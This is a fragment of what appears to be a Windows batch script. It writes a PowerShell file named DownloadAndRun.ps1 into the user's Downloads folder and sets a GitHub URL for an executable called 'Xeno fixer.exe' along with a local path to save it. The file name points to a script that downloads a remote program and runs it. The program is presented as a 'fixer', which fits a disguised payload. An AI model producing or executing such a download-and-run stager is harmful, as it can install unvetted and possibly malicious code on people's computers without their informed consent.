...
echo $url = "https://github.com/madeby3213/Xeno-fix/raw/refs/heads/main/Xeno%20fixer.exe" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo $output_file = "$env:USERPROFILE\Downloads\Xeno%fixer.exe" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
